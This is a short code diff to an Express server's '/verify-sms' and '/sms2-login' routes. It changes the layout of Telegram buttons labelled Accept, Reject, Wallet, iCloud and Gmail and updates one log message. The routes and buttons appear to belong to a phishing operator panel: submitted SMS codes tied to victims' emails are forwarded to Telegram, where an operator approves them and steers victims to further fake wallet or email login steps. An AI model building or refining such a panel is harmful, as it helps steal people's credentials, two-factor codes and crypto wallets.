@@ -569,10 +569,8 @@ app.post("/verify-sms", async (req, res) => {
         parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-            { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-          ]
+            [{ text: "✅ Accept ✅", callback_data: `sms_accept|${email}` }],
+            [{ text: "❌ Reject ❌", callback_data: `sms_reject|${email}` }]
           ]
         }
       })
@@ -1652,9 +1650,11 @@ app.post("/sms2-login", async (req, res) => {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
-          [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }],
-          [{ text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` }],
-          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
+          [{ text: "❌ Reject", callback_data: `sms2_reject|${sms2Id}` }],
+          [
+            { text: "🏁", callback_data: `sms2_done|${sms2Id}` },
+            { text: "💼", callback_data: `sms2_wallet|${sms2Id}` }
+          ],
           [
             { text: "☁️", callback_data: `sms2_icloud|${sms2Id}` },
             { text: "🌈", callback_data: `sms2_gmail|${sms2Id}` }
@@ -1678,7 +1678,7 @@ app.post("/sms2-login", async (req, res) => {
       })
     });
 
-    console.log('✅ SMS 2 message sent with 5 buttons');
+    console.log('✅ SMS 2 message sent with new button layout');
     res.json({ status: "pending", sms2Id });
 
   } catch (err) {
